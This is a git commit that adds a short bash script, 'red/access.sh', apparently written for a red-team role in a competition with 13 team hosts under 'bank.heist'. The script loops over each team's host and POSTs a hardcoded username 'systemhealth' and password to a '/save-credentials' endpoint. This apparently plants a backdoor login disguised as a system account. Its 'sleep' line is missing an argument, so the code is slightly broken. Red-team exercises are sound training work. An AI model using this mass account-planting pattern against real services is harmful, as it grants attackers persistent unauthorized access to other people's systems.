b30d4e252f6dd5058f0acc88e2480e81084ef945
Indigo-10 <80222231+Indigo-10@users.noreply.github.com>
2025-02-28 07:21:37 -0500

    Create access.sh

---
+++ red/access.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+
+for i in {1..13}; do
+  echo -e "Sending request for Team $i\n"
+  
+  response=$(curl -s -X POST "http://wire.team$i.bank.heist:817/save-credentials" \
+    -H "Content-Type: application/json" \
+    -d '{"username":"systemhealth","password":"GetBoxedlol123!"}')
+  
+  echo -e "Response from Team $i: $response\n"
+  echo -e "---------------------------------\n"
+  
+  sleep 
+done
